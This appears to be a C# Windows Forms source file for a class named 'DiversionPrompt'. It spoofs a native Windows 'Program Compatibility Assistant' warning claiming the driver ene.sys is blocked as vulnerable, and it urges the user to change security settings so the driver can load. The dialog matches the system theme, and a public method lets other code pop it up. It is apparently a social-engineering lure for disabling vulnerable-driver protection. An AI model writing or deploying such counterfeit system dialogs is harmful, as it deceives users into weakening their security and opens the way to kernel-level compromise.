using System;
using System.Drawing;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Drawing.Drawing2D;

public class DiversionPrompt : Form
{
    public DiversionPrompt()
    {
        bool lightMode = !UsingLightTheme();

        this.Text = "Program Compatibility Assistant";
        this.FormBorderStyle = FormBorderStyle.FixedDialog;
        this.Size = new Size(460, 300);
        this.StartPosition = FormStartPosition.CenterScreen;

        if (!lightMode)
        {
            this.BackColor = Color.FromArgb(32, 32, 32); // Dark background
            this.ForeColor = Color.White;
        }

        // Warning icon
        this.Icon = SystemIcons.Warning;
        
        // Error Title
        Label titleLabel = new Label
        {
            Text = "A driver cannot load on this device",
            Font = new Font("Segoe UI", 11, FontStyle.Bold),
            Location = new Point(30, 20),
            Size = new Size(370, 30)
        };
        this.Controls.Add(titleLabel);

        // Error Info
        Label driverInfo = new Label
        {
            Text = "Driver: ene.sys\nene.sys\n\nA security setting is detecting "+
                   "this as a vulnerable driver and\nblocking it from loading. "+
                   "You'll need to adjust your settings to load\nthis driver",
            Font = new Font("Segoe UI", 9),
            Location = new Point(30, 60),
            Size = new Size(370, 100)
        };
        this.Controls.Add(driverInfo);

        CheckBox dontShow = new CheckBox
        {
            Text = "Don't show this message again",
            Location = new Point(30, 170),
            Size = new Size(250, 30)
        };
        
        if (!lightMode)
        {
            dontShow.ForeColor = Color.White;
        }

        this.Controls.Add(dontShow);

        Button learnMore = new Button
        {
            Text = "Learn more",
            Location = new Point(30, 210),
            Size = new Size(195, 30),
            BackColor = Color.LightSkyBlue,
            FlatStyle = FlatStyle.Flat
        };

        learnMore.Click += (s, e) => MessageBox.Show("Redirecting to help page...");
        this.Controls.Add(learnMore);

        Button cancel = new Button
        {
            Text = "Cancel",
            Location = new Point(230, 210),
            Size = new Size(185, 30),
            FlatStyle = FlatStyle.Flat
        };
        
        if (!lightMode)
        {
            cancel.BackColor = Color.FromArgb(64, 64, 64);
            cancel.ForeColor = Color.White;
        }

        cancel.Click += (s, e) => this.Close();
        this.Controls.Add(cancel);
    }

    bool UsingLightTheme()
    {
        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"))
            {
                if (key != null)
                {
                    object value = key.GetValue("AppsUseLightTheme");
                    if (value is int themeValue)
                    {
                        return themeValue == 1;
                    }
                }
            }
        } catch (Exception)
            {
                // Default Fallback
                return true;
            }

        return true;
    }

    // This method provides external objects to trigger this winform
    public void ShowPrompt()
    {
        Application.EnableVisualStyles();
        Application.Run(new DiversionPrompt());
    }
}